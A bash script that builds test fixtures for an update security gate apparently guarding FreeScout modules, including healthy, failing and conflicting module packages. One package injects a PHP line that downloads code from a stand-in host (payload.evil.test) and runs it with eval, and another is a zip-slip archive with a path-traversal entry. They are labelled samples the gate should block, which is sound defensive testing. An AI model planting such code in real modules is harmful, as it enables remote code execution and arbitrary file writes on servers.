#!/usr/bin/env bash
#
# Builds the test module "UgTestModule" (installed version 1.0.0) and its packages, inside the FreeScout container:
#
#   /tmp/ug-it/pkg/healthfail-1.1.0.zip   clean code, but its native health check fails  → rollback expected
#   /tmp/ug-it/pkg/malicious-1.2.0.zip    downloads and runs remote code                 → Security Gate blocks
#   /tmp/ug-it/pkg/healthy-1.3.0.zip      clean and healthy                              → update expected
#   /tmp/ug-it/pkg/zipslip.zip            path traversal entry                           → refused, never extracted
#   /tmp/ug-it/pkg/SHA256SUMS             checksums of the packages
#
# Test data only (domains in .test); nothing here is ever executed except the healthy test module.
#
# PHP code is passed in single quotes on purpose (written into the test files as is)
# shellcheck disable=SC2016
set -Eeuo pipefail

ROOT=/tmp/ug-it
SRC=$ROOT/src
PKG=$ROOT/pkg
rm -rf "$SRC" "$PKG"
mkdir -p "$SRC" "$PKG"

# module <dir> <version> <health exit code> [extra php code in a service]
module() {
    local dir="$1" version="$2" health="$3" extra="${4:-}"
    mkdir -p "$dir/UgTestModule/Providers" "$dir/UgTestModule/Console" "$dir/UgTestModule/Services"
    cat > "$dir/UgTestModule/module.json" <<EOF
{
    "name": "UgTestModule",
    "alias": "ugtestmodule",
    "description": "UpdateGuard integration test module",
    "version": "$version",
    "active": 0,
    "order": 900,
    "providers": ["Modules\\\\UgTestModule\\\\Providers\\\\UgTestModuleServiceProvider"],
    "aliases": {},
    "files": [],
    "requires": []
}
EOF
    cat > "$dir/UgTestModule/Providers/UgTestModuleServiceProvider.php" <<'EOF'
<?php

namespace Modules\UgTestModule\Providers;

use Illuminate\Support\ServiceProvider;

class UgTestModuleServiceProvider extends ServiceProvider
{
    public function register()
    {
        $this->commands([\Modules\UgTestModule\Console\HealthCommand::class]);
    }

    public function boot()
    {
    }
}
EOF
    cat > "$dir/UgTestModule/Console/HealthCommand.php" <<EOF
<?php

namespace Modules\UgTestModule\Console;

use Illuminate\Console\Command;

class HealthCommand extends Command
{
    protected \$signature = 'ugtestmodule:health {--json}';

    protected \$description = 'Health check of the UpdateGuard test module';

    public function handle()
    {
        \$code = $health;
        \$this->line(json_encode(['status' => \$code === 0 ? 'ok' : 'fail', 'module' => 'UgTestModule', 'version' => '$version']));

        return \$code;
    }
}
EOF
    cat > "$dir/UgTestModule/Services/Worker.php" <<EOF
<?php

namespace Modules\UgTestModule\Services;

class Worker
{
    public function run(\$payload)
    {
        file_put_contents(storage_path('app/ugtestmodule.json'), json_encode(\$payload));
        $extra
    }
}
EOF
}

package() {
    local name="$1" version="$2" health="$3" extra="${4:-}"
    local dir="$SRC/$name"
    module "$dir" "$version" "$health" "$extra"
    (cd "$dir" && zip -qr "$PKG/$name-$version.zip" UgTestModule)
}

# installed version
module "$SRC/installed" 1.0.0 0
# packages
package healthfail 1.1.0 1
package malicious 1.2.0 0 '$code = file_get_contents("https://payload.evil.test/stage2.txt"); eval(base64_decode($code));'
package healthy 1.3.0 0
# 1.4.0 declares (interop.json) a conflict with the installed UpdateGuard and an optional integration with Refresh (absent)
module "$SRC/compat" 1.4.0 0
cat > "$SRC/compat/UgTestModule/interop.json" <<'EOF'
{
    "project": {"id": "ug-test-module", "name": "UgTestModule", "interop_protocol": "1.0.0"},
    "compatibility": {
        "freescout": ">=1.0.0",
        "projects": {
            "update-guard": {"relationship": "conflict", "name": "UpdateGuard", "conflicts": [">=1.0.0"], "repository": "https://github.com/00MY00/UpdateGuard"},
            "refresh": {"relationship": "optional_integration", "name": "Refresh", "supported_versions": ">=1.7.0 <2.0.0", "legacy": {"supported_versions": ">=1.5.0 <1.7.0"}}
        }
    }
}
EOF
(cd "$SRC/compat" && zip -qr "$PKG/compat-1.4.0.zip" UgTestModule)
mkdir -p "$SRC/zipslip/UgTestModule"
echo '{"name":"UgTestModule","alias":"ugtestmodule","version":"9.9.9"}' > "$SRC/zipslip/UgTestModule/module.json"
php -r '
$zip = new ZipArchive();
$zip->open($argv[1], ZipArchive::CREATE | ZipArchive::OVERWRITE);
$zip->addFile($argv[2], "UgTestModule/module.json");
$zip->addFromString("UgTestModule/../../../../tmp/ug-zip-slip.php", "<?php echo 1;");
$zip->close();' "$PKG/zipslip.zip" "$SRC/zipslip/UgTestModule/module.json"

(cd "$PKG" && sha256sum ./*.zip | sed 's# \./# #' > SHA256SUMS)
cat "$PKG/SHA256SUMS"
